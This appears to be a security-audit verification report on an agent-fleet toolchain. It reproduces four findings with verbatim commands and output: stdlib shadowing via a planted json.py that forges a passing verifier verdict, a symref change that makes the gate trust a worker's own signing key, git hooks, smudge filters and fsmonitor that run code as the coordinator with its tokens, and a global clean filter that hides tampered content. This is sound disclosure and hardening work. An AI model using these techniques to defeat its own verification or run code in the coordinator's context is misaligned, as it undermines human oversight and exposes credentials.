# Verify V2 — control plane and git custody (B1/B3/B4)

RUN: run_secaudit_20261027 · VERIFIER: v2 · BASE: 15e03dfe · MODE: read-only, scratch under mktemp -d

Re-derived from the code at `15e03dfe` alone; the write-ups of W3/W4 were read only after each
reproduction was built. All scratch trees are `mktemp -d` (this uid cannot write `/tmp/opencode`);
the repo's own `.git` was never touched. Tracked tree stays clean apart from this file.

## Verdicts

| id | claim | verdict | observed |
|---|---|---|---|
| B1 | `python3` runs `verify.py` without `-I`/`-P`; a committed sibling `runtime/scripts/json.py` shadows the stdlib and the toolchain hash does not cover it | **CONFIRMED (P0)** | same manifest bytes, exit 2 → **exit 0**, signed transcript binds the stale file's own sha256, `toolchain.files` = the same 7 first-party names, `json.py` absent; `mv json.py away` → exit 2 again; `-I` and `-P` each neutralise the plant |
| B2 | `symbolic-ref --short refs/remotes/origin/HEAD` makes the gate build `PUBKEY=…@<local branch>` | **CONFIRMED (P1)** | gate block replayed verbatim yields `DEF_REF=workerbranch` / `PUBKEY=.orca/dispatch-pubkey@workerbranch`; verify.py accepts the worker's self-signed record (rc 0), refuses the same record at `@refs/remotes/origin/main` (rc 2); moving the branch a second time makes the *same* key path validate a *third* key, rc 0 |
| B3 | `posix._git` runs bare `git` with `env=None`, no `gitexec`, so a repo-declared `core.hooksPath`/`filter` executes as the coordinator | **CONFIRMED (P0)** | `post-checkout` and `filter.evil.smudge` both fired on the coordinator-side `worktree add` (rc 0); `core.fsmonitor` fired on the `:873` `reset -q`; the hook saw `GH_TOKEN` and `ORCA_*`; with `GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/dev/null` and `core.fsmonitor=false` every marker stayed empty |
| B4 | `wtree.sh` leaves global git config in force, so a global `filter.<d>.clean` executes and *chooses* the fingerprint | **CONFIRMED (P1)** | `wtree.sh` printed `07f43bde…` == `git rev-parse HEAD^{tree}` while the worktree held different bytes; a marker showed the global clean ran; with `GIT_CONFIG_GLOBAL=/dev/null` the same tree fingerprints `92b1cc8d…` and `verify.py check_commands` calls the identical record STALE |

## B1 — CONFIRMED (P0)

- Setup + command (verbatim)

```
R=$(mktemp -d); mkdir -p $R/rs $R/repo
cp runtime/scripts/{verify.py,_verify_sig.py,diff_scope.py,ed25519.py,dispatch-sign.py,inventory.py,gitexec.py} $R/rs/
cd $R/repo && git init -q -b main . && printf -- '- AC-1: …\n' > contract.md
git commit …(base) ; git commit …(head, docs-only range)
# manifest claims pr.reviewed_sha = base_sha while head_sha moved  → stale-review invariant
python3 $R/rs/verify.py --manifest manifest.json --contract-source contract.md@$BASE \
  --contract-digest $DIG --unit-class report-only
```

- Observed (verbatim, exit codes, the before/after and the control direction)

Control, no plant — the range and the plant-free tree:

```
FAIL: stale review: reviewed_sha '7af79e22…' != head_sha '3cc9f55c…'
verify: 1 invariant(s) failed — unit is NOT done
CONTROL_EXIT=2
```

Same bytes, `json.py` beside the copied verifier (proxies the stdlib, rewrites `pr.reviewed_sha`
to `head_sha` inside `loads`):

```
manifest bytes (unchanged): f7a738282392b1b8fd5502d5da09625ebfcbdc0af35e23547a12cc4dee3e7748
NOTE: … NOTE: …
verify: OK — all required checks passed
PLANTED_EXIT=0
transcript exit: 0 | manifest_sha256: f7a738282392b1b8fd5502d5da09625ebfcbdc0af35e23547a12cc4dee3e7748
toolchain.files: ['_verify_sig.py', 'diff_scope.py', 'dispatch-sign.py', 'ed25519.py', 'gitexec.py', 'inventory.py', 'verify.py']
count: 7 | json.py bound?: False
```

Control direction — the plant is the cause:

```
--- control direction: same bytes, plant moved away ---
FAIL: stale review: reviewed_sha '7af79e22…' != head_sha '3cc9f55c…'
MOVED_AWAY_EXIT=2
--- and back ---
REPLANTED_EXIT=0
--- plant still present, interpreter flags ----
with -I   EXIT=2 (plant neutralised)
with -P   EXIT=2
with neither EXIT=0
```

The signed artefact is not merely wrong, it is *self-consistent*: `manifest_sha256` is the sha256
of the stale bytes (`f7a738…`, the file's real hash — the verifier never judged it, but the
transcript says it did), and `toolchain.files` is the full 7/7 that `run_report.py` re-hashes at
the graded pin.

- Declared / pinned? (grep result)

Nothing. `grep -n -- "-I\b|-P\b|PYTHONSAFEPATH|PYTHONNOUSERSITE"` over `verify-gate.sh`,
`run_report.py`, `verify.py` and `.github/workflows/*.yml` returns only `verify.py:1393` and
`:1625` — those *parse* an `-I` in the graded command line, they never add one to the verifier's
own invocation. `verify-gate.sh:224` is `"$PY_BIN" "$HERE/verify.py" "$@" &`; `docs/verify-gate.md:96`
and `:145` tell operators `python3 runtime/scripts/verify.py …` (script dir = `sys.path[0]`).
The precedent exists and is partial: `python3 -I` at `spawn_worker.sh:191,300,445,536,545,670`
and `deny-hook.sh:244,292,824`; `tests/test_deny_hook.py:1999-2042` plants `json.py`/`re.py`/
`shlex.py`/`fnmatch.py` and proves the *hook* was fixed after #592. No test plants a sibling for
`verify.py`. Both toolchain tuples — `verify.py:3091-3092` and `run_report.py:517-518` — enumerate
seven first-party file names, so a stdlib-named sibling cannot be bound even in principle.

- Severity you assign and why

**P0, unchanged.** The precondition is weak: a fleet worker runs the gate from its own worktree, so
`$HERE` *is* that worktree's `runtime/scripts` and a committed `json.py` loads on the next
invocation with no install step; the doc's own re-verification command has the same shape. The
gain is a full false GO — scope, freshness, ledger, NC and review all judged on an object the
verifier never read — with a transcript that binds the untouched bytes and a matching toolchain, so
`run_report` re-derivation agrees. `hashlib.py` extends it to the transcript's own hashes. The
`-I`/`-P` result above is the two-character proof that the floor is the missing piece.

## B2 — CONFIRMED (P1)

- Setup + command (verbatim)

```
# scratch origin + clone; coordinator pubkey A committed on main; worker pubkey B committed on
# branch workerbranch; record signed with B's seed (dispatch-sign.py sign --manifest-id u2 …)
git symbolic-ref refs/remotes/origin/HEAD refs/heads/workerbranch
# the gate's block, replayed verbatim (verify-gate.sh:141-145):
DEF_REF="$("$GIT_BIN" -C "$TOP" symbolic-ref --quiet --short refs/remotes/origin/HEAD 2>/dev/null || echo origin/HEAD)"
if "$GIT_BIN" -C "$TOP" cat-file -e "$DEF_REF:.orca/dispatch-pubkey" 2>/dev/null; then
  PUBKEY=".orca/dispatch-pubkey@$DEF_REF"
…
python3 verify.py --manifest m.json --contract-source contract.md@$BASE --contract-digest sha256:$DIG \
  --unit-class report-only --provenance ci --repo acme/x --dispatch-record rec.json \
  --dispatch-pubkey ".orca/dispatch-pubkey@<ref>"
```

- Observed (verbatim, exit codes, the before/after and the control direction)

```
=== what a normal clone/set-head gives ===
origin/main
=== worker moves the symref at a LOCAL branch (its own) ===
symbolic-ref --short -> workerbranch
full target          -> refs/heads/workerbranch
=== replay the gate's own block (verify-gate.sh:141-145) verbatim ===
DEF_REF=workerbranch
PUBKEY=.orca/dispatch-pubkey@workerbranch
--- the blob at that key path is the WORKER's pubkey: ---
59c57a42…(blob) == worker pub 59c57a42…
coordinator pub: 25c5e0d4…
```

```
=== A) gate-built key @workerbranch ===
NOTE: dispatch record signature verified against the supplied key (#135) — a soundness boundary only if that key is trusted (off-worker: CI/MCP/SDK or an auditor)
verify: OK — all required checks passed
EXIT_A=0

=== B) coordinator-owned ref @refs/remotes/origin/main ===
FAIL: dispatch record signature INVALID for the supplied pubkey — not signed by that key (forged or wrong key); fail-closed (#135)
EXIT_B=2
```

Movability, same key path, second move (third keypair, new record):

```
=== C) the SAME key path, branch advanced, pin replaced a second time ===
pubkey blob at workerbranch now: 2e81a828…
NOTE: dispatch record signature verified against the supplied key (#135) …
verify: OK — all required checks passed
EXIT_C=0
--- null control: same new record, coordinator ref ---
FAIL: dispatch record signature INVALID … EXIT=2
```

- Declared / pinned? (grep result)

`docs/verify-gate.md:128` promises *"read from `refs/remotes/origin/HEAD` in the target
repository"* — the full remote-tracking ref. The code never produces that string: `--short` on a
symref whose target is `refs/heads/x` prints `x`. Nothing re-classes the value downstream:
`verify.py:read_source` (296-302) accepts any ref `git show ref:path` resolves, and
`check_dispatch_provenance` (3250) reports only "verified against the supplied key", never the ref
class. No test covers the local-target case.

- Severity you assign and why

**P1, unchanged.** Not P0 because the native in-session lane is already declared advisory — but the
h409 F-2 guard ("on a sound lane never read the pin from the working tree") is exactly what this
defeats on the surface that *claims* soundness: `ORCA_PROVENANCE=ci|mcp|sdk|dispatch` on the
worker's own machine. The key source becomes a branch the graded worker `update-ref`s at will
(demonstrated twice), so the sound-lane "trusted key" collapses to a self-signed record with a
`NOTE` that still says the signature verified. `actions/checkout` normally carries no
`origin/HEAD`, so a pure CI clone is only hit if a step creates the symref.

## B3 — CONFIRMED (P0)

- Setup + command (verbatim)

```
R3=$(mktemp -d); repo with commit(s); the plant is one ordinary worker action in the repo:
  git config core.hooksPath $R3/evilhooks      # + executable $R3/evilhooks/post-checkout
  git config filter.evil.smudge "sh -c 'echo PWNED-smudge >> $MARK; cat'"
  committed .gitattributes: `a.txt filter=evil`
then the COORDINATOR-side call, i.e. the shipped code path:
  sys.path.insert(0, "<repo>/runtime"); from providers.posix import PosixWorktreeProvider
  p.worktree_create("victim2")                 # → posix._git(["worktree","add",…]), env=None
```

- Observed (verbatim, exit codes, the before/after and the control direction)

```
--- .git/config shows the plant (repo-declared, shared by every worktree): ---
/tmp/tmp.aJkJgGfT2p/evilhooks
=== coordinator-side call, no floor (the code as shipped) ===
wt = …/worktrees/victim
EXIT=0
MARK now: PWNED-post-checkout

=== same call WITH the gitexec floor (core.hooksPath=/dev/null) ===
EXIT=0
MARK now:
```

```
=== FRESH worktree add (unique name) — smudge filter materialises the bytes ===
EXIT=0
MARK: PWNED-smudge
PWNED-post-checkout
=== core.fsmonitor as a PROGRAM, fired by the :873 reset path ===
reset rc = 0
MARK: PWNED-fsmonitor
=== same reset WITH the gitexec floor (hooksPath off, fsmonitor off) ===
reset rc = 0
MARK:
```

Environment and reach (the hook is not run under any scrub — `env=None` inherits everything):

```
MARK: PWNED-post-checkout env: GH_TOKEN=ghp_sentinel ORCA_UNIT_CLASS=mutation
```

The config is genuinely the worker's to write: its worktree's `.git` is `gitdir: …/.git/worktrees/victim2`,
and `git config core.hooksPath …` run *inside* the worker worktree lands in the shared
`repo/.git/config` (`git -C repo config --get core.hooksPath` → `/tmp/worker-chosen-hooks`).
Home is shared too — no `HOME=` anywhere in `spawn_worker.sh`/`posix.py`, and the container path
passes `--user $(getuid):$(getgid)` (`posix.py:1357,1371`), so it is a same-uid host.

- Declared / pinned? (grep result)

`gitexec.py:24-27` documents precisely this floor, and `posix.py` references `gitexec` **zero**
times (`grep -c gitexec runtime/providers/posix.py` → `0`); `_git` is `subprocess.run(["git", …],
env=env)` with every lifecycle caller passing `env` unset (`:775,:873,:988,:995,:1084`). The nearby
test `tests/test_posix_provider.py:697` *"test_planted_hooks_and_config_are_stripped_before_host_reads"*
covers only `sandbox.git` (`_sanitize_sandbox_git`, `:800`) *after* the container — not the shared
`.git/config` read by `worktree add` before it. `_git_ok(safe + …)` at `:846` adds `-c` pairs but
still no hooksPath/fsmonitor floor.

- Severity you assign and why

**P0, unchanged** — but with one correction to the framing: the hook does not gain a *different*
uid, the worker already runs commands as this uid through its own Bash tool. What it gains is
**execution outside the deny hook and outside its worktree, in the coordinator's context, with the
coordinator's whole environment** (demonstrated with `GH_TOKEN`), triggered by a coordinator
lifecycle verb the worker does not have to be present for. `filter.smudge` additionally makes the
materialised bytes of the next worktree attacker-chosen, i.e. the coordinator boots a worker into
content it did not check. One `git config` + one committed `.gitattributes` is the whole exploit.

## B4 — CONFIRMED (P1)

- Setup + command (verbatim)

```
R4=$(mktemp -d); export HOME=$R4/home            # scratch HOME, as instructed
git config --global filter.evil.clean "sh -c 'echo PWNED-global-clean >> $R4/marker.txt; printf \"v1\n\"'"
# repo commits .gitattributes: `tampered.txt filter=evil`, tampered.txt = "ORIGINAL CONTENT"
# commit is made, then the worktree is TAMPERED without committing:
echo "COMPLETELY DIFFERENT TAMPERED CONTENT" > tampered.txt
sh runtime/scripts/wtree.sh $R4/repo
```

- Observed (verbatim, exit codes, the before/after and the control direction)

```
global filter.clean = sh -c 'echo PWNED-global-clean >> …/marker.txt; printf "v1\n"'
committed tree (pristine) = 07f43bdefbcb87fce41242abdf9f19445cdab7cb
worktree tampered.txt = COMPLETELY DIFFERENT TAMPERED CONTENT
wtree.sh printed     = 07f43bdefbcb87fce41242abdf9f19445cdab7cb
git rev-parse HEAD^{tree} = 07f43bdefbcb87fce41242abdf9f19445cdab7cb
VERDICT: fingerprint EQUALS the pristine committed tree (tamper invisible)
ACE marker (the global clean ran as the coordinator): PWNED-global-clean
```

`git status --porcelain` still says ` M tampered.txt` throughout. Fed to the real check, the same
record is graded fresh, and the truthful fingerprint is graded stale:

```
--- verify.py check_commands over the TAMPERED worktree, record = the filtered fingerprint ---
check_commands -> ["NOTE: commands ledger FRESH — 1 exit-0 record(s) bound to head_sha's tree 07f43bdefbcb. …"]
=== CONTROL: same tampered worktree, fingerprint with the global config dropped ===
truthful fingerprint = 92b1cc8d2b515b8b969101d91812645562328071 (differs from 07f43bdefbcb…)
--- verify.py check_commands with the RECORD still claiming the pristine tree ---
check_commands -> [NOTE: commands ledger FRESH …]
--- and with the truthful one, for completeness ---
check_commands -> ["commands ledger: no recorded command with exit 0 whose wtree is head_sha's tree 07f43bdefbcb… — the recorded run was made on other content, so it is STALE …"]
```

The asymmetry is sharper than claimed: the *same* driver declared repo-scope is not merely
detected, it fails closed — `rc=3`, `wtree: tampered.txt: filtered by repo-declared driver evil and
staged differently from HEAD … so no fingerprint (#629)`, marker empty. A global driver is the one
scope that gets neither the neutralisation nor the exit-3 net.

- Declared / pinned? (grep result)

Declared as a *choice*, not a gap: `wtree.sh:76-80` — "Global/system config is left in force for
fidelity … The coordinator's clean-env re-run is the backstop"; `:151-153` `case "$_from" in
system|global) continue ;; esac` drops exactly those scopes from `DECLARED` before the exit-3 check
at `:239`. `grep -rn global tests/test_wtree*.py` is empty (there is no `test_wtree*.py` at all);
the premise "it is the coordinator's own" is true per *file* and false per *user*, since `HOME` is
shared and the container even passes the same uid.

- Severity you assign and why

**P1, unchanged for the integrity half** — this defeats the one machine-check that binds "tests ran"
to content (`verify.py:1276-1277`, `c.get("wtree") == want`), and it does so *silently*, on the leg
whose whole purpose is to replace worker narration. Argument for P2: `evidence-manifest.md:87,113`
already makes the coordinator's clean-env re-run at `head_sha` the stronger authority. Argument
against: that re-run also checks out the *committed* tree, so the two oracles are defeated by the
same thing — uncommitted content that the filter maps back to the committed blob; and P1 sits right
for "the freshness check is answered by the graded party's own config". The ACE half alone is a
weaker version of B3.

## Cross-cutting note

B3 and B4 are one custody mistake seen from two sides: `gitexec.env()` exists, is documented, and
is applied by every other read-side tool (`inventory`, `evidence-run`, `preflight`, `floor_guard`
via `driver_blanks`) — but `verify-gate.sh` → `verify.py` and `posix.py` both bypass it by design
(verify keeps a private `_Authority` floor; posix has none), and `wtree.sh` applies it to repo scope
only. B1 is the same shape in the interpreter rather than in git: the hardening is present
everywhere except the one process that decides the verdict.
